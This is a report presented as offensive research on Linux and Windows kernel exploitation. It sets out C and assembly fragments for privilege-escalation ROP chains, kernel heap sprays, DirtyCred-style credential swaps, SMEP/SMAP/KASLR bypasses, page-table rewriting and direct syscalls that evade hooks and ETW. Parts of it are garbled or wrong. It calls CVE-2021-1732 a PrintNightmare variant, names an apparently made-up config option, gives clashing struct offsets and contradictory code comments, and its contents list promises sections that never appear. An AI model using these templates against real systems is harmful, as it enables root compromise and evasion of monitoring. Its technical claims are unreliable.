# Ring 0 (Kernel) Exploitation & Rootkits: Advanced Techniques and Offensive Methodology

> **Classification**: Technical Research Report  
> **Scope**: Linux & Windows kernel exploitation, rootkit techniques, eBPF attack surface  
> **Audience**: Security researchers, red team operators, exploit developers  
> **Threat Model**: Local privilege escalation (LPE) from unprivileged user → root/kernel

---

## Table of Contents

1. [Advanced Kernel Exploitation Techniques](#1-advanced-kernel-exploitation-techniques)
   - [ROP Chains in Kernel Context](#11-rop-chains-in-kernel-context)
   - [Kernel Heap Spraying](#12-kernel-heap-spraying)
   - [Cross-Cache Attacks in SLUB](#13-cross-cache-attacks-in-slub)
   - [Type Confusion Attacks](#14-type-confusion-attacks)
   - [SMEP Bypass via ROP Gadgets](#15-bypassing-smep-via-rop-gadgets)
   - [SMAP Bypass](#16-bypassing-smap)
   - [KASLR Bypass](#17-bypassing-kaslr)
   - [Ret2dir and Novel Approaches](#18-ret2dir-and-other-novel-approaches)
2. [Windows Kernel Exploitation](#2-windows-kernel-exploitation)
3. [Rootkits: Operating in Ring 0](#3-rootkits-operating-in-ring-0)
4. [Linux Kernel Subsystems Most Vulnerable](#4-linux-kernel-subsystems-most-vulnerable)
5. [eBPF as Attack Surface and Defense](#5-ebpf-as-attack-sand-defense)

---

## 1. Advanced Kernel Exploitation Techniques

### 1.1 ROP Chains in Kernel Context

Kernel ROP (Return-Oriented Programming) is the foundational primitive for post-exploitation once an attacker achieves controlled instruction pointer redirection in Ring 0. Unlike userland ROP, kernel ROP must account for interrupted contexts, per-CPU data structures, and the fact that the kernel never "returns" to a well-defined exit point — the attacker must manually restore execution context or pivot to a clean `swapgs; iretq` sequence.

#### Stack Pivoting

When a vulnerability provides a write primitive but not a direct RIP control (e.g., a heap overflow that corrupts a function pointer), the attacker must first **pivot the stack** to a controlled region:

```
; Classic stack pivot gadget in vmlinux
xchg eax, esp ; ret      ; 0xffffffff810000dd
mov rsp, rax ; ret       ; alternative: move controlled value to RSP
```

Common pivot destinations:
- **User-mapped page**: Only viable when SMAP is disabled or bypassed.
- **Kernel heap object**: When the attacker controls a heap object whose address is knowable (post-KASLR bypass).
- **`init_task` stack region**: Per-CPU interrupt stacks have predictable offsets once KASLR base is known.

```c
// Stack pivot via corrupted stack pointer
// If we corrupt a saved RSP on the kernel stack:
unsigned long *pivot_addr = (unsigned long *)controlled_heap_object;
pivot_addr[0] = pop_rdi_ret;         // gadget 1
pivot_addr[1] = 0;                    // uid = 0 for commit_creds
pivot_addr[2] = commit_creds;         // gadget 3
pivot_addr[3] = swapgs_pop_rbp_ret;   // gadget 4
pivot_addr[4] = 0;                    // dummy RBP
pivot_addr[5] = iretq_ret;           // gadget 5
// IRETQ frame follows...
```

#### kROP (Kernel ROP) Chain Construction

A full kROP chain for LPE typically follows this structure:

| Stage | Purpose | Typical Gadgets |
|-------|---------|-----------------|
| 1 | Prepare arguments | `pop rdi; ret` → `0x0` (init_cred or NULL for prepare_kernel_cred) |
| 2 | Escalate privileges | Call `commit_creds(prepare_kernel_cred(0))` |
| 3 | Restore GS base | `swapgs` gadget |
| 4 | Return to userland | `iretq` gadget + IRETQ frame |
| 5 | Userland shell | `execve("/bin/sh", NULL, NULL)` via signal handler or direct |

```c
// Full kROP chain payload construction
struct krop_chain {
    uint64_t pop_rdi;
    uint64_t init_cred;          // &init_cred — avoids needing prepare_kernel_cred
    uint64_t commit_creds;
    uint64_t swapgs;
    uint64_t nop;                // padding
    uint64_t iretq;
    // IRETQ frame
    uint64_t user_rip;           // &shell
    uint64_t user_cs;
    uint64_t user_rflags;
    uint64_t user_sp;
    uint64_t user_ss;
};
```

**Key insight**: Modern kernels link `commit_creds` and `prepare_kernel_cred` as global symbols. Using `init_cred` directly (address of the initial credentials struct) with `commit_creds` eliminates one function call, shortening the chain.

#### Sigreturn-Oriented Programming

An alternative to traditional ROP in kernel context:

```c
// SROP in kernel — set all registers via rt_sigreturn
// Construct a sigframe on the stack:
struct ucontext uc;
uc.uc_flags = 0;
uc.uc_stack.ss_sp = 0;
uc.uc_mcontext.gregs[REG_RIP] = (unsigned long)&shell;
uc.uc_mcontext.gregs[REG_CS]  = USER_CS;
uc.uc_mcontext.gregs[REG_RFL]  = USER_RFLAGS;
uc.uc_mcontext.gregs[REG_RSP]  = USER_SP;
uc.uc_mcontext.gregs[REG_SS]   = USER_SS;
// Set RDI = 0 before sigreturn for commit_creds path
```

SROP is less common in kernel exploits than userland due to the constrained context, but remains viable when the attacker controls a large contiguous stack region.

---

### 1.2 Kernel Heap Spraying

Heap spraying in the kernel is fundamentally different from userland. The kernel uses multiple allocators (SLAB, SLUB, SLOB) and employs per-CPU partial slabs, making spray timing and object placement critical.

#### msg_msg Spraying

The `msg_msg` structure is one of the most reliable spray primitives in modern Linux kernels because:
- It has a **variable size** (controlled via `msgsnd` data length)
- Its header is always allocated from `kmalloc-cg-*` (cgroup-aware caches)
- It contains inline data that can hold arbitrary content
- The `msg_msg` header includes `m_list`, `m_type`, `m_ts` (size), and `next` pointer — all controllable

```c
// msg_msg spray — allocate objects of precise size
struct {
    long mtype;
    char mtext[TEXT_SIZE];
} msg;

// Allocate from kmalloc-1024:
msg.mtype = 1;
memset(msg.mtext, 0x41, TEXT_SIZE);
msgsnd(qid, &msg, TEXT_SIZE, 0);

// msg_msg header layout (64-byte minimum):
// offset 0x00: struct list_head m_list (next, prev)  
// offset 0x10: long m_type
// offset 0x18: size_t m_ts          ← total message size
// offset 0x20: struct msg_msgseg *next  ← next segment pointer
// offset 0x28: void *security         ← SELinux metadata
// offset 0x30+: char mtext[]          ← user-controlled data begins here
```

**Overwriting `m_ts`**: If an attacker can corrupt the `m_ts` field of a `msg_msg`, subsequent `msgrcv` with `MSG_COPY` will read past the allocated object boundary — a powerful **out-of-bounds read primitive**.

**Overwriting `next` pointer**: Corrupting the `msg_msgseg *next` pointer redirects the read to an arbitrary kernel address, creating an **arbitrary read primitive**.

```c
// Arbitrary kernel read via corrupted msg_msg.next
// 1. Spray msg_msg objects into target slab cache
// 2. Corrupt the "next" pointer of a msg_msg to point to target address
// 3. Read out-of-bounds data via msgrcv(MSG_COPY)
// Result: kernel memory at arbitrary address is leaked to userspace
```

#### pipe_buffer Spraying

`pipe_buffer` objects are allocated from `kmalloc-cg-1024` (or `kmalloc-1024` on non-cgroup systems). Each `pipe` allocates an array of 16 `pipe_buffer` structures when `fcntl(F_SETPIPE_SZ)` increases the pipe capacity:

```c
// pipe_buffer structure (40 bytes each, 16 per allocation = 640 bytes)
struct pipe_buffer {
    struct page *page;          // offset 0x00 — page pointer
    unsigned int offset, len;   // offset 0x08 — data offset and length
    const struct pipe_buf_operations *ops; // offset 0x10 — VTABLE!
    unsigned int flags;         // offset 0x14
    unsigned long private;      // offset 0x18
};

// Spray technique:
int pipe_fds[2];
pipe(pipe_fds);
fcntl(pipe_fds[1], F_SETPIPE_SZ, 0x1000 * 16);  // Force large allocation
write(pipe_fds[1], buf, BUF_SIZE);               // Populate pipe_buffer->page
```

**Exploitation vector**: Corrupting `pipe_buffer->ops` pointer redirects execution to a fake vtable — a classic **use-after-free → control flow hijack** primitive. On kernels with `CONFIG_HARDENED_USERCOPY` and RODATA-full, the vtable must point to a writable kernel address where the attacker has placed a fake `pipe_buf_operations` struct.

```c
// DirtyCred-style exploitation using pipe_buffer
// 1. Free the pipe_buffer array (close pipe or reduce pipe size)
// 2. Reallocate the freed slot with a controlled object
// 3. The stale pipe_buffer->ops now points into attacker-controlled data
// 4. Trigger ops->release() via close(pipe_fd) → RIP control
```

#### sk_buff (Socket Buffer) Spraying

`sk_buff` objects are allocated from `kmalloc-cg-2048` or larger, depending on payload size. They are created via `socket(AF_INET, SOCK_DGRAM, ...)` and filled with `sendmsg()`:

```c
// sk_buff spray via sendmsg
struct msghdr msg = {0};
struct iovec iov;
char payload[2048] = {0};

iov.iov_base = payload;
iov.iov_len = sizeof(payload);
msg.msg_iov = &iov;
msg.msg_iovlen = 1;

sendto(sockfd, payload, sizeof(payload), 0,
       (struct sockaddr *)&addr, sizeof(addr));
// Allocates an sk_buff + payload data in kernel slab
```

**Advantage over msg_msg**: `sk_buff` allocations go through `__alloc_skb()` which uses `kmalloc_reserve()` — this can target different cache sizes and is not susceptible to the same `msg_msg` size restrictions.

| Spray Primitive | Cache Target | Min Size | Max Size | Controllable Fields | Use Case |
|----------------|-------------|----------|----------|---------------------|----------|
| `msg_msg` | `kmalloc-cg-*` | 64 bytes | 64KB | `m_ts`, `next`, `mtext` | OOB read, arb. read, data spray |
| `pipe_buffer` | `kmalloc-cg-1024` | 640 bytes | 640 bytes | `page`, `ops` (vtable) | UAF control flow hijack |
| `sk_buff` | `kmalloc-cg-2048+` | ~512 bytes | 64KB | Payload data | Data spray, cross-cache fill |
| `setxattr` | `kmalloc-cg-*` | 4 bytes | Variable | Arbitrary data | Small-object spray |
| `add_key` | `kmalloc-*` | Variable | Variable | Description + payload | Keyring spray |
| `userfaultfd` | N/A (page faults) | 4096 bytes | N/A | Page fault handling | Race condition exploitation |

---

### 1.3 Cross-Cache Attacks in SLUB

The SLUB allocator segregates objects by size into dedicated caches (`kmalloc-32`, `kmalloc-64`, etc.). Direct exploitation within a single cache is increasingly difficult due to freelist hardening. **Cross-cache attacks** exploit the fact that multiple kernel subsystems share the same underlying slab page.

#### Attack Principle

```
Cache A (e.g., kmalloc-512):
  [obj_A1] [obj_A2] [obj_A3] ... [obj_A16]

All objects in this slab page are freed → page returned to page allocator

Same physical page is then allocated by Cache B (e.g., for a different subsystem):
  [obj_B1] [obj_B2] [obj_B3] ... [obj_B16]

Now obj_B1 occupies the same physical memory formerly held by obj_A1.
A dangling pointer to obj_A1 now dereferences obj_B1 — TYPE CONFUSION.
```

```c
// Cross-cache attack workflow
// 1. Exhaust the per-CPU partial list for kmalloc-X
// 2. Force slab pages to be returned to the page allocator
//    (free ALL objects from a given slab page)
// 3. Trigger allocation from the target subsystem that reclaims the page
// 4. Old dangling pointer now aliases the new object type

// Defrag: fill and free to recycle pages
for (int i = 0; i < NUM_SPRAY; i++) {
    allocate_vulnerable_object();    // fills slab pages
}
for (int i = 0; i < NUM_SPRAY; i++) {
    free_vulnerable_object();        // returns pages to page allocator
}
// Now trigger the target subsystem allocation
allocate_cross_cache_object();       // reclaims the freed pages
```

#### Modern SLUB Hardening and Evasion

Recent kernels (5.13+) implement several hardening measures that complicate cross-cache attacks:

| Hardening | Mitigation | Bypass Strategy |
|-----------|------------|-----------------|
| `CONFIG_SLAB_FREELIST_HARDENED` | XOR-obfuscated freelist pointers with random mistag | Don't corrupt freelist; corrupt object payloads |
| `CONFIG_SLAB_FREELIST_RANDOM` | Randomized initial freelist order | Spray to fill all positions; bypass via large spray |
| `CONFIG_INIT_ON_FREE_DEFAULT_ON` | Zeroing freed objects | Must win race before zeroing completes; use cross-cache instead of same-cache UAF |
| `CONFIG_HARDENED_USERCOPY` | Bounds checking on `copy_to_user`/`copy_from_user` | Use objects without size-tracked copy operations |
| `CONFIG_CC_HARDENED_ARRAY` | Array bounds checking via `__builtin_add_overflow` | Corrupt pointer fields instead of array indices |
| SLAB_TYPESAFE_BY_RCU | Freed objects not immediately reclaimed | Use `call_rcu()` delay window; cross-cache still viable |

**Cross-cache remains viable** because the page allocator does not enforce type safety — a page freed from `kmalloc-512` can be reallocated as a page for an `ext4` extent buffer or a `pipe_buffer` array.

---

### 1.4 Type Confusion Attacks

Type confusion in the kernel occurs when an object of one type is interpreted as another, typically through UAF, double-free, or incorrect downcasting. The kernel's use of `void *` and generic containers (`list_head`, `hlist_node`) creates numerous type confusion opportunities.

#### Common Type Confusion Patterns

```c
// Pattern 1: UAF with wrong object type reclamation
// Victim: struct tty_struct (allocated from kmalloc-4096)
// Attacker sprays: struct msg_msg (allocated from kmalloc-4096)
// After free, tty_struct pointer now dereferences msg_msg data
// tty_struct->ops is read from attacker-controlled msg_msg.mtext

// Pattern 2: Incorrect downcast
// struct bpf_map is extended by struct bpf_array, bpf_htab, etc.
// A BPF map of type BPF_MAP_TYPE_ARRAY is cast to (struct bpf_htab *)
// when the verifier incorrectly tracks the map type — leading to
// out-of-bounds access via htab-specific operations

// Pattern 3: Namespace / cgroup confusion
// User namespaces vs. init namespaces — accessing PID namespace
// of a sandboxed process while holding init_user_ns credentials
```

#### DirtyCred (CVE-2022-2588 variant technique)

DirtyCred is a generalized type confusion technique that replaces **credential structures** (`struct cred`) with more privileged ones:

```
Phase 1: Allocate a cred object (struct cred) in kmalloc-192
Phase 2: Free the cred without invalidating pointers that reference it
Phase 3: Spray a different object type into the same kmalloc-192 slot
Phase 4: The task still references the slot, now interpreting it as a cred
         → attacker-controlled uid/gid/capabilities
```

```c
// DirtyCred simplified exploitation flow
// 1. open("/proc/self/attr/keycreate", O_WRONLY); write new context
// 2. Trigger bug that frees our cred without proper RCU
// 3. Spray msg_msg into kmalloc-192 to fill the freed cred slot
// 4. Our thread's current_cred() now reads from msg_msg data
//    where uid=0, gid=0, caps=0xffffffff are in our control
```

---

### 1.5 Bypassing SMEP via ROP Gadgets

**SMEP** (Supervisor Mode Execution Prevention, Intel) / **PXN** (Privileged Execute Never, ARM) prevents the kernel from executing userland pages. When SMEP is active, `CR4.SMEP = 1`, and any attempt to execute code at a userland virtual address from Ring 0 triggers a page fault.

#### ROP-Based SMEP Bypass

The canonical bypass requires no userland code execution — only ROP gadgets from the kernel image:

```x86asm
; SMEP bypass via CR4 modification (legacy, CPID=0)
mov rax, cr4
and rax, ~(1 << 20)    ; Clear SMEP bit (bit 20)
mov cr4, rax
; Now userland pages are executable from ring 0
; ... execute userland shellcode ...
```

However, **CR4 writes are no longer viable** on hardened systems because:
1. `CR4` pinning (since 5.3): The kernel writes the desired CR4 value, then marks it read-only using WP-bit tricks
2. `nosmep` / `noexec` command line mitigations
3. Some hypervisors intercept CR4 writes

**Modern approach**: Stay purely in ROP — never execute userland code:

```c
// Pure kROP chain that never needs userland execution
uint64_t rop_chain[] = {
    pop_rdi_ret,
    (uint64_t)&init_cred,        // or 0 for prepare_kernel_cred
    (uint64_t)commit_creds,
    pop_rcx_ret,                 // clean up function return
    0,
    pop_rdi_ret,
    (uint64_t)&init_task,        // find init task's cred
    (uint64_t)commit_creds,
    swapgs_ret,
    iretq_ret,
    // IRETQ frame
    (uint64_t)&shell,
    USER_CS,
    USER_RFLAGS,
    USER_SP,
    USER_SS,
};
```

#### SMEP Bypass via `native_write_cr4` Gadget

Some older exploits used the kernel's own `native_write_cr4` function as a gadget:

```c
// Gadget: native_write_cr4 (arch/x86/kernel/cpu/common.c)
// This function writes CR4 with the value in RDI
// If CR4 pinning hasn't occurred yet, this clears SMEP:
uint64_t chain[] = {
    pop_rdi_ret,
    0x406f0,           // CR4 with SMEP cleared
    native_write_cr4,
    // ... jump to userland shellcode ...
};
```

This is mitigated on modern kernels by **CR4 pinning** after boot (`cr4_init()`).

---

### 1.6 Bypassing SMAP

**SMAP** (Supervisor Mode Access Prevention) prevents Ring 0 from **reading or writing** userland pages (extending SMEP, which only prevents execution). SMAP is enforced by `CR4.SMAP = bit 21`.

```x86asm
; SMAP violation: kernel tries to read userland address
; #PF error code: bit 1 (caused by write) or bit 0 (caused by fetch) + bit 15 (SGX)
; Result: kernel oops / panic
```

#### Bypass via `copy_from_user` / `copy_to_user` Abuse

The kernel provides sanctioned user-kernel data transfer functions that temporarily disable SMAP:

```c
// These functions use STAC/CLAC instructions to toggle AC flag (RFLAGS)
// which disables SMAP for the duration of the copy:
copy_from_user(kernel_buf, user_ptr, size);   // STAC; ... ; CLAC
copy_to_user(user_ptr, kernel_buf, size);      // STAC; ... ; CLAC
_get_user(val, user_ptr);                       // variant for small values
_put_user(val, user_ptr);                        // variant for small values
unsafe_copy_from_user(...);                     // no STAC — caller must handle
unsafe_put_user(...);                           // no STAC — caller must handle
```

**Bypass strategy**: If the attacker can call `copy_from_user()` or `copy_to_user()` with controlled arguments from a ROP chain or via a corrupted function pointer, they can exfiltrate kernel data to userland or inject data from userland into kernel memory:

```c
// SMAP bypass via ROP chain calling copy_to_user
uint64_t rop[] = {
    pop_rdi_ret,
    (uint64_t)user_buf,          // destination: userland buffer
    pop_rsi_ret,
    (uint64_t)kernel_addr,       // source: kernel address to leak
    pop_rdx_ret,
    0x100,                       // size to copy
    copy_to_user,                 // will STAC, copy, CLAC
    // ... continue with privilege escalation ...
};
```

#### Bypass via `user_access_begin` / `user_access_end`

Some kernel paths manually open SMAP windows:

```c
// Pattern found in various kernel subsystems:
if (user_access_begin(user_ptr, size)) {
    unsafe_get_user(val, user_ptr, label);
    // val now contains user-provided data
    user_access_end();
}
```

If an attacker can redirect execution into a `user_access_begin` block and control `user_ptr`, they effectively bypass SMAP for the duration of the access window.

#### Hardware-Level Bypass: AC Flag (Alignment Check)

The `AC` (Alignment Check) flag in `RFLAGS` disables SMAP when set. Some exploits use this:

```x86asm
; Set AC flag to disable SMAP
pushf
or dword [rsp], 0x40000    ; Set AC (bit 18)
popf
; Now kernel can access userland pages
```

This is mitigated by `STAC`/`CLAC` tracking in the kernel's entry code and by `CONFIG_HARDENED_USERCOPY` checking copy sizes.

---

### 1.7 Bypassing KASLR

**KASLR** (Kernel Address Space Layout Randomization) randomizes the base address of the kernel text, modules, and various data structures at boot. On x86_64, the kernel text offset is randomized in 2MB-aligned units within a 1GB range (≈ 512 possible positions).

#### Information Leaks

The most reliable KASLR bypass is an **information disclosure** that reveals a kernel pointer:

| Leak Source | Method | Typical Kernel Address |
|-------------|--------|----------------------|
| `/proc/kallsyms` | Requires `CAP_SYSLOG` or root | All kernel symbols |
| `/sys/kernel/notes` | Exposes `.note` sections with addresses | Build-time pointers |
| `dmesg` | Kernel log may contain pointers | Various |
| `/proc/iomem` | Physical memory map | `0x........-0x........ : Kernel code` |
| `perf_event_open` | PMU event sampling can leak addresses | Code addresses |
| `BPF` maps | `/proc/sys/kernel/ptrace_scope` + BPF | BPF JIT addresses |
| Uninitialized memory | Heap UAF read before reinit | Kernel heap pointers |
| `msg_msg.m_ts` overflow | OOB read past msg boundaries | Kernel data |
| `/proc/self/stat` | Side-channel via timing | Kernel text addresses |

```c
// KASLR bypass via /proc/kallsyms (requires CAP_SYSLOG or root)
// On modern kernels, unprivileged users see all zeros:
// $ cat /proc/kallsyms
// 0000000000000000 T _text
// 0000000000000000 T startup_64
// 
// But if kptr_restrict is 0 or attacker has CAP_SYSLOG:
// $ cat /proc/kallsyms
// ffffffff81000000 T _text
// ffffffff81001000 T startup_64
```

#### Uninitialized Memory / UAF Read

```c
// KASLR leak via uninitialized slab memory
// 1. Allocate and free an object that contained kernel pointers
// 2. Allocate a different object type in the same slab slot
// 3. Read the object — stale pointer data leaks KASLR base

// Concrete example (CVE-2020-29374-style):
struct sockaddr_un addr;
socklen_t len = sizeof(addr);
// After connect() without fill, sockaddr_un.sun_path is uninitialized
// and may contain kernel pointers from prior allocations
getsockname(sockfd, (struct sockaddr *)&addr, &len);
// addr.sun_path may leak a kernel pointer
```

#### Side-Channel KASLR Bypasses

| Side Channel | Mechanism | Bandwidth | Reliability |
|-------------|-----------|-----------|-------------|
| TLB timing | Probe TLB entries for mapped kernel pages | Bits: address bits | Low |
| Cache (Flush+Reload) | Probe shared L3 cache lines | Medium | Medium |
| Branch Prediction | Spectre-v2 style BTB probing | Bits: address | Medium |
| PMU events | perf counters leak instruction-level info | High | High |
| Page fault timing | Distinguish mapped vs. unmapped kernel pages | Bits: existence | Medium |
| DEVMEM `/dev/mem` | Direct physical memory access (needs `CAP_SYSRAWIO`) | Full | High |

```c
// Spectre-v2 based KASLR bypass (simplified)
// Attacker trains branch predictor for kernel indirect calls
// Then measures timing difference when kernel code at specific offset is mapped
// 
// for each possible kaslr_offset in range:
//   train_btb(kaslr_offset + target_symbol);
//   flush_cache();
//   indirect_call(); // timed
//   if (fast_time): kaslr_offset is correct
```

#### `/dev/mem` and `/dev/kmem` Bypass

```c
// If /dev/mem is readable (requires root or CAP_SYSRAWIO):
int fd = open("/dev/mem", O_RDONLY);
lseek(fd, 0x1a0000, SEEK_SET);  // Physical address of kernel text
read(fd, buf, sizeof(buf));      // Read kernel image directly
// Parse for known byte patterns to find KASLR offset
```

On most hardened systems, `/dev/mem` is disabled via `CONFIG_STRICT_DEVMEM`, which allows only PCI ROM and RAM regions to be accessed from userspace.

---

### 1.8 Ret2dir and Other Novel Approaches

#### Ret2dir (Return-to-Direct-Mapped Memory)

**Ret2dir** exploits the kernel's **physmap** — the direct-mapped memory region that maps physical memory 1:1 starting at a fixed virtual address (`__START_KERNEL_map + TEXT_OFFSET` on x86_64, typically `0xffff888000000000`).

The key insight: **kernel heap objects are accessible via both their slab address and their physmap alias**. If a userland page is allocated at physical address `P`, it appears at both:
- Userland virtual address `U`
- Physmap virtual address `P + DIRECT_MAP_BASE`

```
Physical Memory Layout:
  +-----------+ 0x0000000000000000
  | ...       |
  +-----------+ 0x0000000012345000  ← physical page
  | User page |                     ← mapped at user VA 0x7f...
  +-----------+ 
  | ...       |
  +-----------+ 0xffff888000000000  ← DIRECT_MAP_BASE (physmap)
  | physmap   |
  +-----------+ 0xffff88812345000  ← SAME physical page, accessible from kernel!
  | User page |                     ← kernel can read/write HERE
  +-----------+ 
```

```c
// Ret2dir exploitation:
// 1. Allocate userland page at physical address P
// 2. Compute physmap address: P + DIRECT_MAP_BASE
// 3. Write ROP chain into userland page
// 4. Corrupt kernel pointer to redirect to physmap alias
// 5. SMAP is bypassed — the kernel accesses physmap VAs, not user VAs
// 6. SMEP is bypassed if physmap pages are executable (they're not normally)
//    → but for data-only attacks, physmap RW is sufficient
```

**Mitigation**: Modern kernels implement `CONFIG_HARDENED_USERCOPY` and KFENCE which can detect some physmap-based attacks. However, the physmap still exists for performance reasons, and the attack surface remains partially viable.

#### Modifying Page Tables from Ring 0

Once in Ring 0, an attacker with a write primitive can modify PTEs (Page Table Entries) directly:

```c
// Walk page tables to find a userland page's PTE
// Then set PTE flags:
//   - Set present bit (bit 0)
//   - Set writable bit (bit 1)  
//   - Set privilege bit to supervisor (bit 2 cleared)
//   - Set NX bit cleared (bit 63 on x86_64)
//
// This creates a user-accessible, kernel-executable page:
//   → Bypasses both SMEP and SMAP for the modified page

// PTE format (x86_64):
// Bit 63: NX (No Execute)
// Bit  2: U/S (0=supervisor, 1=user)
// Bit  1: R/W (0=read-only, 1=read-write)
// Bit  0: Present
// Bits 12-51: Physical frame number

uint64_t pte = *pte_addr;
pte &= ~(1ULL << 63);   // Clear NX → make executable
pte |= (1ULL << 1);     // Set R/W → make writable
pte |= (1ULL << 2);     // Set U/S → user accessible
*pte_addr = pte;         // Write modified PTE
__asm__ volatile("invlpg (%0)" :: "r"(target_addr));  // Flush TLB
```

#### Double-Fetch Race Conditions

A **double-fetch** vulnerability occurs when the kernel copies data from userland twice, and the user modifies it between reads:

```c
// Vulnerable kernel pattern:
long vulnerable_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
    struct user_data local;
    copy_from_user(&local, (void __user *)arg, sizeof(local));
    
    // Validation
    if (local.size > MAX_SIZE)
        return -EINVAL;
    
    // SECOND COPY — attacker can change local.size between reads!
    copy_from_user(&local, (void __user *)arg, sizeof(local));
    // Now local.size may be > MAX_SIZE, bypassing validation
    
    process_data(local.buf, local.size);  // Buffer overflow!
}
```

#### Use of `userfaultfd` for Exploitation

`userfaultfd` allows userspace to handle page faults, enabling precise control over kernel scheduling during races:

```c
// userfaultfd-based race exploitation
// 1. Register a userfaultfd region
// 2. Trigger a kernel copy_from_user() that reads from the region
// 3. Kernel enters userfaultfd handler — suspends in kernel context
// 4. In userfaultfd thread, modify shared data structures
// 5. Resolve the fault — kernel continues with stale/inconsistent state

struct uffd_msg msg;
struct uffdio_copy copy;

// Monitor thread:
read(uffd_fd, &msg, sizeof(msg));
// msg.arg.pagefault.address contains the faulting address

// Modify kernel state while kernel is blocked:
modify_shared_state();

// Resolve fault:
copy.src = (unsigned long)mmap_page;
copy.dst = msg.arg.pagefault.address & ~(PAGE_SIZE - 1);
copy.len = PAGE_SIZE;
copy.mode = 0;
ioctl(uffd_fd, UFFDIO_COPY, &copy);
// Kernel resumes execution — but state has changed!
```

> **Note**: `userfaultfd` is now restricted by `vm.unprivileged_userfaultfd` sysctl (default 0 on many distros) and requires `CAP_SYS_PTRACE` on newer kernels. `FUSE` remains as an alternative for similar fault-control mechanisms.

---

## 2. Windows Kernel Exploitation

### 2.1 Win32k Attacks

The **Win32k subsystem** (`win32k.sys`) is one of the most heavily attacked Windows kernel components. It implements the window manager, GDI (Graphics Device Interface), and user-mode input handling. Its attack surface is enormous because it exposes hundreds of IOCTLs and system calls to unprivileged users.

#### Win32k Architecture

```
User Mode                          Kernel Mode
+------------------+              +---------------------+
| user32.dll       |◄---- syscall ----►| win32k.sys           |
| gdi32.dll        |              |   Window Manager     |
| dxgi.dll         |              |   GDI Rendering      |
+------------------+              |   Desktop Heap       |
         |                        |   Callback dispatch   |
         | NtGdi*/NtUser*        +---------------------+
         v                                 |
+------------------+                        v
| Kernel Callbacks  |              +---------------------+
| (xxxWindowProc)   |              | NTOSKRNL.EXE         |
| SetWindowLongPtr  |              |   Object Manager     |
| Hook callbacks    |              |   Memory Manager     |
+------------------+              +---------------------+
```

#### Common Win32k Bug Classes

| Bug Class | Description | Example CVE |
|-----------|-------------|-------------|
| **UAF in window objects** | Use-after-free via `DestroyWindow` race with callback dispatch | CVE-2019-1457 |
| **Desktop heap overflow** | Buffer overflow in desktop heap allocation | CVE-2020-0986 |
| **Callback returns to kernel** | User-mode callback re-enters kernel with stale state | CVE-2021-1732 |
| **Type confusion** | GDI objects reinterpreted as different types | CVE-2020-16908 |
| **Integer overflow** | Size calculation overflow in bitmap/surface allocation | CVE-2021-27085 |
| **GDI object pool corruption** | Double-free or corrupt GDI handle table | CVE-2020-1361 |

```c
// Classic Win32k UAF pattern:
// 1. Attacker creates window
// 2. Attacker sets a window hook (SetWindowsHookEx)
// 3. Attacker sends a message that triggers kernel callback
// 4. During callback, attacker destroys the window (DestroyWindow)
// 5. Win32k continues using the freed window object → UAF
// 
// The key primitive: user-mode callback during kernel window procedure
// allows attacker to modify state in the middle of kernel operation.

// CVE-2021-1732 (PrintNightmare variant in Win32k):
// win32k!xxxEnableWindowScrollBarTracks
// Attacker-supplied scrollbar info leads to pool corruption
// because validation occurs before user-mode callback,
// but usage occurs after — classic TOCTOU in kernel callbacks
```

#### Desktop Heap Exploitation

The **Desktop Heap** (`Desktop heap`) is a special heap used by `win32k` for window objects, menus, and other desktop objects. It has predictable layouts and minimal randomization:

```c
// Desktop heap spray pattern:
// 1. Create many windows (CreateWindowEx) to fill desktop heap
// 2. Free specific windows to create holes
// 3. Trigger vulnerable allocation that reclaims the hole
// 4. Overlap with adjacent controlled window object

// Windows pool allocation analogs to Linux slab:
// Non-paged pool → always resident (like GFP_ATOMIC kmalloc)
// Paged pool → can be swapped out
// Desktop heap → per-session heap for Win32k objects
```

### 2.2 Registry Virtualization Bugs

Windows registry virtualization redirects registry operations from `HKEY_LOCAL_MACHINE\Software` to `HKEY_CURRENT_USER\Software\VirtualStore` for legacy applications. Implementation bugs in this redirection layer have led to privilege escalation:

```c
// Registry virtualization attack pattern:
// 1. Create a virtualized registry key in HKCU\Software\VirtualStore
// 2. Trigger a privileged service to read from HKLM\Software
// 3. The virtualization layer redirects to HKCU, reading attacker data
// 4. Privileged service processes attacker-controlled registry values
//    → arbitrary code execution in service context

// CVE-2020-1472 (Zerologon) — related concept:
// Not registry per se, but exploits Netlogon authentication
// bypassing AES-CFB8 integrity checks via all-zero challenge
```

### 2.3 DirectX / Graphics Driver Attacks

Graphics drivers (particularly `dxgkrnl.sys`, the DirectX graphics kernel) are a high-value target:

```c
// Attack surface in DirectX stack:
// - dxgkrnl.sys: Kernel-mode DirectX graphics kernel
// - dxg.sys:      DirectX graphics adapter support  
// - nvlddmkm.sys: NVIDIA driver
// - atikmdag.sys:  AMD driver
// - igdkmd64.sys:  Intel GPU driver
//
// Primary attack vectors:
// 1. Shader compilation (GLSL/HLSL → GPU microcode)
//    - Complex parser → input validation bugs
//    - GPU command buffer submission → arbitrary GPU memory R/W
//
// 2. D3DKMT interface (DirectX Kernel-Mode Transport)
//    - D3DKMTCreateAllocation
//    - D3DKMTOpenResource  
//    - D3DKMTSubmitCommand
//    - Surface/allocation lifecycle management (UAF)
//
// 3. Cross-process GPU object sharing
//    - ShareHandle-based object lookup race conditions
```

```c
// Typical GPU driver exploit flow:
// 1. Create a render target surface via D3D
// 2. Manipulate the surface's GPU virtual address
// 3. Trigger a vulnerability in the command submission path
// 4. Corrupt GPU page tables or system memory via DMA
// 5. Overwrite a kernel function pointer → RIP control

// CVE-2020-1457 (Microsoft Graphics Components RCE):
// Win32k rendering path integer overflow → pool overflow
// in bitmap creation (EngCreateBitmap)
```

### 2.4 NTDLL / KERNEL32 Syscall Interface

The Windows syscall interface differs fundamentally from Linux:

```c
// Linux: direct syscall instruction with stable numbers
// Windows: syscall numbers change between builds
//
// NTDLL stub pattern (x86_64):
// mov r10, rcx          ; Windows calling convention
// mov eax, <syscall#>   ; syscall number (varies by build)
// test byte ptr [SharedUserData+0x308], 1  ; syscall shadow check
// jne fallback_path
// syscall
// ret

// Syscall number extraction for direct syscalls:
// 1. Parse ntdll.dll export table
// 2. For each Nt* function, read the mov eax instruction
// 3. Extract the syscall number
// 4. Use direct syscall to bypass hooks and ETW

// Direct syscall to NtAllocateVirtualMemory (example):
// NtAllocateVirtualMemory(ProcessHandle, BaseAddress, ZeroBits,
//                         RegionSize, AllocationType, Protect)
```

